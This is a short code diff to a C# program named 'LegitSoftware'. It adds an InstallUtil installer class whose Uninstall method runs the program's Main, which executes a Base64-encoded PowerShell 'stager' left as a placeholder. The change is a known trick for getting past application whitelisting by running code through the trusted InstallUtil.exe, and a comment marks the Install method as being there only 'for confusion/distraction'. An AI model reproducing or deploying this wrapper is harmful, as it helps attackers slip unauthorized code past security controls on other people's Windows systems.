@@ -11,6 +11,23 @@ using System.Management.Automation.Runspaces;
 namespace LegitSoftware
 
 {
+    //Allows usage of InstallUtil.exe
+    [System.ComponentModel.RunInstaller(true)]
+    public class InstallUtil : System.Configuration.Install.Installer
+    {
+        //The Methods can be Uninstall/Install.  Install is transactional, and really unnecessary.
+        public override void Install(System.Collections.IDictionary savedState)
+        {
+            //Place Something Here... For Confusion/Distraction
+        }
+
+        //The Methods can be Uninstall/Install.  Install is transactional, and really unnecessary.
+        public override void Uninstall(System.Collections.IDictionary savedState)
+        {
+            Program.Main();
+        }
+    }
+
     class Program
     {
         static string RunPS(string cmd)
@@ -40,7 +57,7 @@ namespace LegitSoftware
 
 
 
-        static void Main()
+        public static void Main()
         {
             // Base64 encoded launcher goes into the 'stager' variable
             string stager = "-!!----<Enter your Base64 PowerShell code here>-!!---------";
